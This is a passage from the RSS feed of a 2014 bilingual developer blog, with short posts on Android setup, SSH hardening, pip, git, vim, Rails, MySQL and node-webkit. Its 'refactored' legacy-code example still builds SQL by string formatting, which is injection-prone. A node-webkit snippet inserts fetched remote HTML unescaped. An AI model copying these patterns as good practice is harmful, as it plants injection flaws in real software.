&lt;p&gt;&lt;os_platform&gt;&lt;os_platform&gt;&lt;os_platform&gt;&lt;os_platform&gt;3. open eclipse -&amp;gt; &amp;#160;window -&amp;gt; Android SDK Manager （记得开启VPN啊亲！ remember to launch your VPN if you are Chinese... )&amp;#160;&lt;br /&gt;3.1 make sure the following libs installed:&amp;#160;&lt;br /&gt;&amp;#160; Android SDK Tools&lt;br /&gt;&amp;#160; Android SDK Platform Tools&lt;br /&gt;&amp;#160; Android SDK Build Tools&amp;#160;&lt;br /&gt;然后在保证在某个Android SDK 目录下，要安装SDK Platform 和ARM EABI这个东东。如下图（ install the following package in the circle area)&amp;#160;&lt;br /&gt;&amp;#160; 我现在是 2014年9月11日，那么我选择了 Android L 和 Android 4.4 W.&amp;#160;&lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/p&gt;
&lt;p&gt;&lt;os_platform&gt;&lt;os_platform&gt;&lt;os_platform&gt;&lt;os_platform&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wOS8xMS8xM181OV80OV8xMTVfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDlfMTFfMTNfNTlfMDAucG5nBjoGRVQ/Screenshot%20from%202014-09-11%2013png:00.:ext" title="Screenshot From 2014 09 11 13:59:00" alt="Screenshot From 2014 09 11 13:59:00" rel="225x255" width="1280" height="800" /&gt;&lt;br /&gt;&lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/p&gt; </description>
      <pubDate>Mon, 08 Sep 2014 00:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/android-setup-android-development-environment</link>
    </item>
    <item>
      <title>保护好服务器的安全( make your server safe ) </title>
      <description>&lt;p&gt;1. 不要使用 默认端口做为 ssh 的端口。 &amp;#160; ( Never and ever use the default port of SSH)&amp;#160;&lt;/p&gt;
&lt;p&gt;办法： &amp;#160;&lt;br /&gt;&amp;#160; 1. &amp;#160;$ vim &amp;#160;/etc/ssh/sshd_config &amp;#160; &amp;#160; , &amp;#160; modify the Port 22&amp;#160;&lt;br /&gt;&amp;#160; 2. &amp;#160;$ /etc/init.d/ssh reload&lt;/p&gt;
&lt;p&gt;2. 不要把服务器的IP地址， PORT 端口以及密码放到 settings.example 文件中。 &amp;#160;目前github 已经成为最大的信息泄漏源。 &amp;#160; ( don't put your server's password to git repo ) &amp;#160;&lt;/p&gt;
&lt;p&gt;3. 经常查看 ： &amp;#160;/var/log/auth.log &amp;#160;， 看看有什么不对进的地方。 （目前我的服务器每天遭受 6000次以上的 SSH 登录尝试。。。） &amp;#160; ( always check your /var/log/auth.log from time to time. currently there are 6k ssh hacks every day to my server )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 29 Aug 2014 01:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/make-your-server-safe</link>
    </item>
    <item>
      <title>node-webkit 的script 必须写在&lt;head&gt;中（ script tag must be in the &lt;head&gt; in node-webkit)</title>
      <description>&lt;p&gt;as it is.&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 20 Aug 2014 08:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/node-webkit-script-head-script-tag-must-be-in-the-head-in-node-webkit</link>
    </item>
    <item>
      <title>python 世界中的bundler （ bundler equivalent in Python ) </title>
      <description>&lt;p&gt;copied from : &lt;a href="http://stackoverflow.com/a/8736419/445908"&gt;http://stackoverflow.com/a/8736419/445908&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;简言之，就是使用 &amp;#160;requirement.txt&lt;/p&gt;
&lt;p&gt;From what i've read about bundler — pip without virtualenv should work just fine for you. You can think of it as something between regular gem command and bundler. Common things that you can do with pip:&lt;/p&gt;
&lt;p&gt;Installing packages (gem install)&lt;/p&gt;
&lt;p&gt;pip install mypackage&lt;br /&gt;Dependencies and bulk-install (gemfile)&lt;/p&gt;
&lt;p&gt;Probably the easiest way is to use pip's requirements.txt files. Basically it's just a plain list of required packages with possible version constraints. It might look something like:&lt;/p&gt;
&lt;p&gt;nose==1.1.2&lt;br /&gt;django&amp;lt;1.3&lt;br /&gt;PIL&lt;br /&gt;Later when you'd want to install those dependencies you would do:&lt;/p&gt;
&lt;p&gt;$ pip install -r requirements.txt&lt;br /&gt;A simple way to see all your current packages in requirements-file syntax is to do:&lt;/p&gt;
&lt;p&gt;$ pip freeze&lt;br /&gt;You can read more about it here.&lt;/p&gt;
&lt;p&gt;Execution (bundler exec)&lt;/p&gt;
&lt;p&gt;All python packages that come with executable files are usually directly available after install (unless you have custom setup or it's a special package). For example:&lt;/p&gt;
&lt;p&gt;$ pip install gunicorn&lt;br /&gt;$ gunicorn -h &lt;br /&gt;Package gems for install from cache (bundler package)&lt;/p&gt;
&lt;p&gt;There is pip bundle and pip zip/unzip. But i'm not sure if many people use it.&lt;/p&gt;</description>
      <pubDate>Tue, 19 Aug 2014 06:06:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/python-bundler-bundler-equivalent-in-python</link>
    </item>
    <item>
      <title>git diff 忽略空白行</title>
      <description>&lt;p&gt;最近的一个项目，文件动辄 几千行，而且是DOS格式的， 一旦在LINUX下保存，再 git diff , 看到的全市空白行的变化。&amp;#160;&lt;/p&gt;
&lt;p&gt;所以， 我们要忽略空白行：&lt;/p&gt;
&lt;p&gt;$ git config --global alias.dfw 'diff --ignore-space-change'&lt;/p&gt;
&lt;p&gt;$ git dfw .&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 18 Aug 2014 10:32:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/git-diff</link>
    </item>
    <item>
      <title>关于前端开发一些利器。 ( some tools for javascript development ) </title>
      <description>&lt;p&gt;Bower  (&lt;a href="http://bower.io/"&gt;http://bower.io/&lt;/a&gt;) :  帮我们下载某个JS插件的各种依赖包。 相当于 ruby中的 bundler.   省得我们为了安装某个JS 插件而手动下载各个第三方js 文件了。 而且可以达到最好的兼容性。 &lt;/p&gt;

&lt;p&gt; Grunt:  (&lt;a href="http://gruntjs.com/"&gt;http://gruntjs.com/&lt;/a&gt;): JS中的自动化工具，帮我们一键完成各种操作 （运行单元测试， 清理临时文件， 生成压缩后的JS文件等） ， 相当于java中的 ant/maven, ruby中的rake 。 &lt;/p&gt; 

&lt;p&gt; Require JS (&lt;a href="http://requirejs.org/"&gt;http://requirejs.org/&lt;/a&gt;)： 当某个项目的JS文件越来越多的时候，可以很方便的加载它们。  &lt;/p&gt;

&lt;p&gt; Jasmine ( &lt;a href="http://jasmine.github.io/"&gt;http://jasmine.github.io/&lt;/a&gt; ) : 单元测试的JS框架。 相当于java中的 JUnit,  Ruby中的 Rspec（语法极其相似） &lt;/p&gt;

&lt;p&gt; 最后， 是一款不必编码就可以使用的工具： selenium( &lt;a href="http://code.google.com/p/selenium/"&gt;http://code.google.com/p/selenium/&lt;/a&gt;&amp;#160; 我们可以录制它的脚本并且回放。 在回放过程中进行判断。 &amp;#160;它还能根据脚本生成各种语言对应的 文件(比如java/ruby/python ) 然后在后台执行。 &amp;#160;如果某个页面的js 特别难于测试，我们就用它～&amp;#160;)   &lt;/p&gt; </description>
      <pubDate>Thu, 14 Aug 2014 08:13:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/some-tools-for-javascript-development</link>
    </item>
    <item>
      <title>nokogiri 的xpath方法比 ancestor() 快的多（nokogiri xpath() is much faster than ancestor()   )</title>
      <description>&lt;p&gt;for short: &amp;#160;using xpath will save your 95% cpu time than using ancestor().first&lt;/p&gt;
&lt;p&gt;我的一个方法，原来使用了 .ancestors().first , &amp;#160; 运行一次3 分钟。 &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;后来改成了 xpath('./ancestor::table[1]') , 运行一次 5秒。 &amp;#160; 节省了大约96%的时间！&lt;/p&gt;

&lt;pre&gt;Finished in 5.81 seconds
3 examples, 0 failures

&lt;/pre&gt;</description>
      <pubDate>Mon, 11 Aug 2014 05:38:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/nokogiri-xpath-ancestor-nokogiri-xpath-is-much-faster-than-ancestor</link>
    </item>
    <item>
      <title>在Rails项目中增加rspec (add rspec to rails and test lib files) </title>
      <description>&lt;p&gt;1. add to Gemfile:&lt;/p&gt;
&lt;pre&gt;# Gemfile: 
gem 'rspec-rails', '~&amp;gt; 3.0.0'

# in console: 
$ bundle exec rails generate rspec:install
&lt;/pre&gt;

&lt;p&gt;2. make sure your have this:
&lt;/p&gt;
&lt;pre&gt;# config/application.rb
config.autoload_paths += %W(#{config.root}/lib)
&lt;/pre&gt;
&lt;p&gt; test a file in lib folder: &lt;/p&gt;
&lt;pre&gt;require 'html_parser'  # it's not require 'lib/html_parser'
describe HtmlParser do

  it 'should parse html_content' do
    puts 'hihihi'
  end 

end

&lt;/pre&gt;</description>
      <pubDate>Sun, 10 Aug 2014 02:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rails-rspec-add-rspec-to-rails-and-test-lib-files</link>
    </item>
    <item>
      <title>干掉文件末尾的^M ( remove trailing ^M characters  ) </title>
      <description>&lt;p&gt;refer to: &lt;a href="http://stackoverflow.com/questions/811193/how-to-convert-the-m-linebreak-to-normal-linebreak-in-a-file-opened-in-vim"&gt;http://stackoverflow.com/questions/811193/how-to-convert-the-m-linebreak-to-normal-linebreak-in-a-file-opened-in-vim&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Within vim, look at the file format — DOS or Unix:&lt;/p&gt;
&lt;p&gt;:set filetype=unix&lt;/p&gt;
&lt;p&gt;:set fileformat=unix&lt;/p&gt;
&lt;p&gt;The file will be written back without carriage return (CR, ^M) characters.&lt;/p&gt;</description>
      <pubDate>Thu, 07 Aug 2014 10:47:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/m-remove-trailing-m-characters</link>
    </item>
    <item>
      <title>拯救腐朽项目的步骤 (steps to save a fallen project ) </title>
      <description>&lt;p&gt;在搭建环境的过程中：&lt;/p&gt;
&lt;p&gt;1. 没有文档。 不知道如何在本地搭建环境&lt;/p&gt;
&lt;p&gt;目前： 所有的开发都是直接把代码'dui3'到生产服务器上。 在钢丝上敲代码。&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;&amp;#160;要安装哪些lib, 哪些 dependency, 哪些数据库，都要写清楚。 &amp;#160; 比如： &amp;#160;项目A，依赖了3中DB: mysql, mongodb, redis. &amp;#160;&lt;/p&gt;
&lt;p&gt;2. 没有本地数据库。 &amp;#160;&lt;/p&gt;
&lt;p&gt;目前： 所有开发都是链接生产数据库。&amp;#160;&lt;/p&gt;
&lt;p&gt;解决办法： 把远程的生产数据库导出来。 由于远程数据太多，所以mysqldump 时只导出前2000条数据 。 &amp;#160;&lt;/p&gt;
&lt;p&gt;3. &amp;#160; 文件不全。&lt;/p&gt;
&lt;p&gt;目前：很多配置文件和运行文件都不在SCM中。&lt;/p&gt;
&lt;p&gt;解决办法： 对比远程的数据，把文件一点一点下载到本地。 对于某些敏感的配置文件， 把它从 settings.py 变成 settings.py.example&lt;/p&gt;
&lt;p&gt;4. &amp;#160;部署方式不规范&lt;/p&gt;
&lt;p&gt;目前： 改好代码之后， 把相关的代码SFTP到生产服务器上。 &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;解决办法： &amp;#160;使用capistrano 做部署， 可以自动化部署，省时省力。而且可以回滚。&lt;/p&gt;
&lt;p&gt;5. 有很多多余的文件，放到了 SCM中。&amp;#160;&lt;/p&gt;
&lt;p&gt;目前： .pyc 这样的编译文件， 以及 .svn 文件，都保存在了 git 中。&amp;#160;&lt;/p&gt;
&lt;p&gt;解决办法： 把它们都删掉。 
&lt;/p&gt;
&lt;pre&gt; 
$ git rm *.pyc
$ find . -name .svn -exec git rm -rf {} \;
&lt;/pre&gt;
&lt;p&gt;6. css, js 文件 过多，没有合并。&lt;/p&gt;
&lt;p&gt;目前： &amp;#160;124个外部 js 文件， &amp;#160;26个外部 css 文件， 每次加载时间 在800ms&lt;/p&gt; 
&lt;pre&gt;150 requests  ❘  78.3 KB transferred  ❘  740 ms (load: 793 ms, DOMContentLoaded: 760 ms
&lt;/pre&gt;
&lt;p&gt;解决办法： &amp;#160;将各种 js, css 都合并。 &amp;#160; （例如ruby中的 &lt;a href="https://github.com/sbecker/asset_packager"&gt;asset_packager: https://github.com/sbecker/asset_packager &lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;7. 命名不规范。&amp;#160;&lt;/p&gt;
&lt;p&gt;目前： &amp;#160;page2/index.html &amp;#160; &amp;#160;page3/index2.html &amp;#160; , &amp;#160; &amp;#160; &amp;#160; xyh = '', &amp;#160; btz = '' &amp;#160;，完全看不懂。 &amp;#160;甚至还有f#ck 这样的文件名。 -_-!&amp;#160;
&lt;/p&gt;
&lt;p&gt;解决办法： &amp;#160;改成有意义的名字，比如： &amp;#160;apple = '' &amp;#160; &amp;#160;tree = '' &amp;#160; &amp;#160;is_from_remote = '' &amp;#160; ，&lt;/p&gt;
&lt;p&gt;8. 各种依赖的外部地址，直接写在了代码中，没有提取出公共的常量，&lt;/p&gt;
&lt;p&gt;目前： 某个地址依赖的外部应用 ： some_app.com  总共出现了6次。而如果不考虑端口，则出现了20多次。&lt;/p&gt;
&lt;p&gt;解决办法：把所有依赖的外部应用都提取到一个配置文件当中。这样修改起来也会很方便。&lt;/p&gt;
&lt;p&gt;9.方法过长：&lt;/p&gt;
&lt;p&gt;目前：程序的入口方法，超过了1200行。注意：这是一个方法哦亲！&lt;/p&gt;
&lt;p&gt;解决办法： 重构，extract method.&lt;/p&gt;
&lt;p&gt;10.代码没有整理过。处女座情何以堪。&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wOC8wNy8xM18zNF8xOV8zNTNfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDhfMDdfMTNfMzNfMjUucG5nBjoGRVQ/Screenshot%20from%202014-08-07%2013png:25.:ext" title="Screenshot From 2014 08 07 13:33:25" alt="Screenshot From 2014 08 07 13:33:25" rel="225x255" width="1280" height="800" /&gt;&lt;/p&gt;
&lt;p&gt;解决办法： 果断代码美化啊亲!  &lt;a href="http://jsbeautifier.org/"&gt;http://jsbeautifier.org/&lt;/a&gt;&amp;#160; （非常给力， 原来7000行的代码，美化之后（变成 4220 行））&lt;/p&gt;
&lt;p&gt;11. 各种 bad smell 的代码：&lt;/p&gt;
&lt;pre&gt;# 老旧代码：
        if res_u != None:
            c.execute(" select user_id,role_id from `stat_acl_role_user` where user_id = %s  " % res_u[0])
            res = c.fetchall()
        else:
            c.execute(" select user_id,role_id from `stat_acl_role_user` limit 1  "   )   
            res = c.fetchall()

# 整理后的代码： (这里用一个 三元表达式 更合适 ）
        if res_u != None:
            sql_string = " select user_id,role_id from `stat_acl_role_user` where user_id = %s  " % res_u[0]
        else:
            sql_string = " select user_id,role_id from `stat_acl_role_user` limit 1  " 
        c.execute(sql_string)
        res = c.fetchall()

&lt;/pre&gt;</description>
      <pubDate>Thu, 07 Aug 2014 03:01:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/steps-to-save-a-fallen-project</link>
    </item>
    <item>
      <title>python 入门 ： import 后调用文件变量</title>
      <description>&lt;p&gt; 如何import 某个文件之后，调用它的变量？  &lt;/p&gt;

&lt;pre&gt;# settings.py
cache_on = 0

# test_settings.py
import settings
print settings.cache_on  # =&amp;gt; 0 
&lt;/pre&gt;</description>
      <pubDate>Thu, 07 Aug 2014 00:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/python-import</link>
    </item>
    <item>
      <title>查看MYSQL中所有DB的大小</title>
      <description>&lt;p&gt;select table_schema 'db_name' , sum(data_length) /1024/1024 'size(mb)' from information_schema.tables group by table_schema;&lt;/p&gt;

&lt;pre&gt;mysql&amp;gt; select table_schema 'stat' , sum(data_length) /1024/1024 'data(mb)', sum(index_length)/1024/1024 'index(mb)' from information_schema.tables group by table_schema;
+--------------------+-----------------+-----------------+
| stat               | data(mb)        | index(mb)       |
+--------------------+-----------------+-----------------+
| gu??_tmp           |     81.62409210 |      0.45410156 | 
| hive_tmp           |      0.27797318 |      0.07910156 | 
| hi??_wireless      |     62.82812500 |     31.01562500 | 
| information_schema |      0.00000000 |      0.00878906 | 
| mobile_production  |      0.52366257 |      0.45312500 | 
| mysql              |      0.54868793 |      0.10058594 | 
| performance_schema |      0.00000000 |      0.00000000 | 
| scheduler          |      8.54602623 |      4.39355469 | 
| slow_query_log     |     18.12500000 |      5.03125000 | 
| sta?               | 300910.57133389 | 185895.51367188 | 
| sta?_cms           |      1.32024574 |      0.11425781 | 
| sta?_freewap       |     27.45990467 |      8.10742188 | 
| stat_wap_pv        |      0.00343323 |      0.00195313 | 
| test               |      0.00012589 |      0.01269531 | 
+--------------------+-----------------+-----------------+
&lt;/pre&gt;</description>
      <pubDate>Tue, 05 Aug 2014 05:59:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/mysql-db</link>
    </item>
    <item>
      <title>rails-jquery 中的callback (callback in rails-jquery (ujs ) ) </title>
      <description>&lt;p&gt;
如下：    （refer to : &lt;a href="http://stackoverflow.com/questions/13224482/rails-confirm-modifier-callback"&gt;http://stackoverflow.com/questions/13224482/rails-confirm-modifier-callback&lt;/a&gt; ) 
&lt;/p&gt;
&lt;pre&gt; &amp;lt;%= coffee_script_tag do %&amp;gt;
 $(document).on 'confirm:complete', (e, answer) -&amp;gt;
   if(answer &amp;amp;&amp;amp; $(e.target).hasClass('push_button') )
     $(e.target).hide()
     $(e.target).parent().prepend("&lt;a href="#" class="btn btn-warning"&gt;推送中...&lt;/a&gt; ")
 &amp;lt;% end %&amp;gt;

&lt;/pre&gt;</description>
      <pubDate>Tue, 05 Aug 2014 01:05:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rails-jquery-callback-callback-in-rails-jquery-ujs</link>
    </item>
    <item>
      <title>很奇怪的 database configuration does not specify adapter （由于多定义了多余的ActiveRecord造成的) </title>
      <description>&lt;p&gt;I met this problem due to the 'multiple database support issue'. In my `app/model` folder, there is a file defined a redundant database connection: &lt;/p&gt;
&lt;pre&gt;class CacheCleanerActiveRecord &amp;lt; ActiveRecord::Base
  establish_connection "cache_cleaner_#{Rails.env}"
  self.abstract_class = true
end
&lt;/pre&gt;
&lt;p&gt;but this database is not found in my database.yml ( because it's not used at all ). &lt;/p&gt;
&lt;p&gt;so the solution is quit simple: remove this file and everything is fine ! &lt;/p&gt;
&lt;p&gt;refer to: &lt;a href="http://stackoverflow.com/questions/413659/database-configuration-does-not-specify-adapter/25101896#25101896"&gt;http://stackoverflow.com/questions/413659/database-configuration-does-not-specify-adapter/25101896#25101896&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sun, 03 Aug 2014 05:22:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/database-configuration-does-not-specify-adapter-activerecord</link>
    </item>
    <item>
      <title>rails 部署时Gemfile  相关的内容( Gemfiles related stuff when deploying Rails app to production) </title>
      <description>&lt;p&gt;1. 最好指定好具体的版本, .e.g: &amp;#160;(give the explicit version )&amp;#160;&lt;/p&gt;
&lt;pre&gt;source 'http://ruby.taobao.org'

gem 'rails', '4.0.0'
gem 'uglifier', '2.4.0'
gem 'coffee-rails', '4.0.1'
&lt;/pre&gt; 
&lt;p&gt;2. $ bundle package --all&lt;/p&gt;
&lt;p&gt;3. 在 config/deploy.rb 中，执行 bundle install --local --without=test , e.g. &lt;/p&gt;
&lt;pre&gt;  task :db_migrate do
    run "cd #{release_path} &amp;amp;&amp;amp; bundle install --local"
    run "cd #{release_path} &amp;amp;&amp;amp; bundle exec rake db:migrate RAILS_ENV=production"
  end 

&lt;/pre&gt;</description>
      <pubDate>Sun, 03 Aug 2014 02:29:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rails-gemfile-gemfiles-related-stuff-when-deploying-rails-app-to-production</link>
    </item>
    <item>
      <title>这才是解决问题的速度</title>
      <description>&lt;p&gt;3天前在node-webkit上提出了个BUG： 没有运行在64位MAC上的版本。结果2天前对方给了我回复。我今天去官方站点一看，居然都已经出来了。&amp;#160;&lt;/p&gt;
&lt;p&gt;这才是解决问题的速度！ rogerwang (node-webkit的作者）好样的！&lt;/p&gt;
&lt;p&gt;refer to: &lt;a href="https://github.com/rogerwang/node-webkit/issues/2133"&gt;https://github.com/rogerwang/node-webkit/issues/2133&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Thu, 31 Jul 2014 11:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/316</link>
    </item>
    <item>
      <title>ubuntu + win7 双系统 (install ubuntu + win7)</title>
      <description>&lt;p&gt;1.在win7下找到一个空盘，比如E盘，先格式化E盘，然后压缩卷，出现绿色。&amp;#160;&lt;/p&gt;
&lt;p&gt;2.然后用光盘安装ubuntu12.04，找到freespace，最关键的就是分区这里了：可以参照 &lt;a href="http://blog.sina.com.cn/s/blog_5f0a505101017s5n.html"&gt;http://blog.sina.com.cn/s/blog_5f0a505101017s5n.html &lt;/a&gt;  安装过程中的手动分区。
&lt;/p&gt;</description>
      <pubDate>Tue, 29 Jul 2014 10:38:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu-win7-install-ubuntu-win7</link>
    </item>
    <item>
      <title>jquery不工作 (jquery not working/trigger ) </title>
      <description>&lt;p&gt;refer to: &lt;a href="http://stackoverflow.com/a/25011343/445908"&gt;http://stackoverflow.com/a/25011343/445908&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;in my case there are multiple forms in current page, and I am using : &lt;/p&gt;
&lt;p&gt;    $('form').validate()  &lt;/p&gt;
&lt;p&gt;which makes jQuery.validate confused. &amp;#160;&amp;#160;solution:  assign a specify ID selector for your form.  e.g.
&lt;/p&gt;
&lt;p&gt;    $('#my_form_id').validate()&lt;/p&gt;
&lt;p&gt;简言之： &amp;#160;为你的form 指定一个ID～&amp;#160;&lt;/p&gt;</description>
      <pubDate>Tue, 29 Jul 2014 08:39:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/jquery-jquery-not-working-trigger</link>
    </item>
    <item>
      <title>delayed_job 由于deadlock而死掉： (Mysql2::Error: Deadlock when attempting to lock a job )</title>
      <description>&lt;p&gt;近期一直遇到这个问题： &amp;#160;delayed_job 由于deadlock而死掉： ( 报错是： Mysql2::Error: Deadlock when attempting to lock a job ) &amp;#160;(these days I am being troubled by this problem)&amp;#160;&lt;/p&gt;
&lt;p&gt;解决办法1： &amp;#160; (solution 1)&amp;#160;&lt;/p&gt;
&lt;p&gt;使用 god 的keepalive特性来控制它。 &amp;#160; 这个方法非常丑陋，不建议使用（ 它会一直占用一个进程， 100% 的CPU占用率）&lt;/p&gt;
&lt;p&gt;解决办法2： ( solution2)&amp;#160;&lt;/p&gt;
&lt;p&gt;refer to: 
&lt;a target="_blank" href="https://github.com/collectiveidea/delayed_job_active_record/issues/63#issuecomment-25468573" style="background-color: transparent;"&gt;https://github.com/collectiveidea/delayed_job_active_record/issues/63#issuecomment-25468573&lt;/a&gt;

&lt;/p&gt;
&lt;pre&gt;# in your Gemfile: 
#gem 'delayed_job_active_record', '4.0.1'
gem 'delayed_job_active_record', git: 'https://github.com/aaronjensen/delayed_job_active_record.gi
t', branch: 'retry-deadlock-on-delete'
&lt;/pre&gt;

</description>
      <pubDate>Tue, 29 Jul 2014 01:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/delayed_job-deadlock-mysql2-error-deadlock-when-attempting-to-lock-a-job</link>
    </item>
    <item>
      <title>ruby on rails 是web开发王道啊亲！</title>
      <description>&lt;p&gt;22分钟从0 搭建环境， 写出一个假接口， 调通前端后端，再来16 分钟使用真实数据 + 润色。&lt;/p&gt;

&lt;p&gt;换另外一个语言试试。。。。&lt;/p&gt;

&lt;img src="http://f.hiphotos.bdimg.com/album/w%3D2048/sign=6eeb3c0163d9f2d3201123ef9dd48b13/0d338744ebf81a4c4410ef29d62a6059252da62b.jpg" /&gt; &lt;br /&gt;
&lt;p&gt;精锐游击队一样干掉 战五渣 正规军&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSIiMjAxNC8wNy8yNi8xOV8wMF8wOV8yMzZfXy5wbmcGOgZFVA/%E6%88%98%E4%BA%94%E6%B8%A3.png" title="战五渣" alt="战五渣" rel="450x450" width="653" height="719" /&gt;&lt;/p&gt;</description>
      <pubDate>Sat, 26 Jul 2014 10:55:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruby-on-rails-web</link>
    </item>
    <item>
      <title>node 中的 context / scope ( node-webkit context) </title>
      <description>&lt;p&gt;node 中，每段js 都会有自己的 context &amp;#160;. 这点理解起来跟ruby, raw html/js很不一样。&lt;/p&gt;
&lt;p&gt;看看官方的说法： (&lt;a href="https://github.com/rogerwang/node-webkit/wiki/Differences-of-JavaScript-contexts"&gt;https://github.com/rogerwang/node-webkit/wiki/Differences-of-JavaScript-contexts&lt;/a&gt;

&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If the require() method (of Node.js modules API) is used, then the required module runs in the Node's context. (When you call the require() function or a function from some required module, the JS engine enters the Node's context and leaves it after the function returns.)&lt;/li&gt;

&lt;li&gt;If HTML &amp;lt;script src="..."&amp;gt; element (or jQuery's $.getScript(), or any other similar method) is used in some window, then the script runs in the context of that window.&lt;/li&gt;

&lt;li&gt;If the module is given as the value of the "node-main" property of the application's manifest file, then the module runs in the Node's context but later has access to the window object. (See the “node-main” article for details.)&lt;/li&gt;
&lt;/ul&gt;

 &lt;p&gt;总之，它有3个不同的 context &amp;#160;。 实际上用起来是这个效果：&lt;/p&gt;
&lt;p&gt;想让JS在全局生效， 需要在package.json 中设置 'node-main' 这个属性， 例如 &lt;/p&gt;
&lt;p&gt; 1. package.json &lt;/p&gt;
&lt;pre&gt;{
  "name": "nw-demo",
  "node-main": "index.js",
  "main": "index.html"
}
&lt;/pre&gt;

&lt;p&gt;2 .index.js:  &lt;/p&gt;
&lt;pre&gt;var i = 0;
exports.callback0 = function () {
    console.log(i + ": " + window.location);
    window.alert ("i = " + i);
    i = i + 1;
}
&lt;/pre&gt;
&lt;p&gt; 3. 最后，在HTML中引用这个方法： &lt;/p&gt;
&lt;pre&gt;&amp;lt;body onload="process.mainModule.exports.callback0()"&amp;gt;
&lt;/pre&gt;
&lt;p&gt;但是，如果在 &amp;#160;index.js 中引入 jQuery, 会报错： &amp;#160;jquery 需要一个 window, document啥啥的。&lt;/p&gt;
&lt;p&gt;所以， 我们需要下面的代码： &amp;#160;（也就是说，每一个HTML都要有自己的 $ = require('jquery') )&amp;#160;&lt;/p&gt;

&lt;pre&gt;  &amp;lt;div id='target_site'&amp;gt;&amp;lt;/div&amp;gt;
  &amp;lt;script&amp;gt;
    url = 'http://siwei.me'
    $ = require('jquery')
    request = require('request')
    request(url, function(error, response, body){
      if (!error &amp;amp;&amp;amp; response.statusCode == 200 ) {
        $('#target_site').html(body)
        //console.info(body)
        alert('ok!')
      }
    })

&lt;/pre&gt;</description>
      <pubDate>Sat, 26 Jul 2014 08:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/node-context-scope-node-webkit-context</link>
    </item>
    <item>
      <title>在 node-webkit中使用数据库 (using db in node-webkit)</title>
      <description>&lt;p&gt;参考：  &lt;a href="https://github.com/rogerwang/node-webkit/wiki/Save-persistent-data-in-app"&gt;https://github.com/rogerwang/node-webkit/wiki/Save-persistent-data-in-app&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. web SQL database &amp;#160;（我想说： 太麻烦了吧！ 本来 javascript语言就充满了各种无用的 {}, (), ; ， 现在还要写raw SQL. &amp;#160;好消息是 这个技术能用。 另一个好消息是替代产品已经出来了）&lt;/p&gt;

&lt;pre&gt;&amp;lt;script&amp;gt;
      var db = openDatabase('auto_cart', '1.0', 'db of auto_cart', 2 * 1024 * 1024)
      db.transaction(function(tx){
        tx.executeSql('create table if not exists conditions(id unique, text)');
        tx.executeSql('insert into conditions(id ,text) values (1, "cpu condition")');
        tx.executeSql('insert into conditions(id ,text) values (2, "memory condition")');
      });

      db.transaction(function(tx){
        tx.executeSql('select * from conditions', [], function(tx, results){
          var len = results.rows.length, i;
          for (i = 0; i&amp;lt; len; i++){
            alert(results.rows.item(i).text);
          }
        });
      });
&amp;lt;/script&amp;gt;
&lt;/pre&gt;
&lt;p&gt;2.&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sat, 26 Jul 2014 06:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/node-webkit-using-db-in-node-webkit</link>
    </item>
    <item>
      <title>node-webkit上手体验( first glance at node-webkit )</title>
      <description>&lt;p&gt;1. 引用 lib时，要记得定义一个变量，来在后面的页面调用它。比如最经典的jquery:  
&lt;/p&gt;
&lt;pre&gt; var $ = require('jquery')
&lt;/pre&gt;
&lt;p&gt;2. 使用 &amp;#160;$ npm install &amp;lt;lib_name&amp;gt; 来安装 （node 知识）&lt;/p&gt;
&lt;p&gt;3. 使用前最好前过一遍wiki 的基本内容。 让你对它的 build, package, run ， namespace 等有一个大概的了解。&lt;/p&gt;
&lt;p&gt;4. 把里面的代码能走的就走一遍，&lt;/p&gt;
&lt;p&gt;5. 对于这个app的应用的设置（页面的宽度，初始形状等等），都在package.json, &amp;#160;注意其中的 iframe 选项， 它甚至可以把 浏览器的 地址栏， 和状态栏等等全都取消， 看起来完全就是个 桌面app. &amp;#160;&lt;/p&gt;
&lt;p&gt;6. 还能设置 tray 哦亲！ （桌面右下角的小图标）&lt;/p&gt;
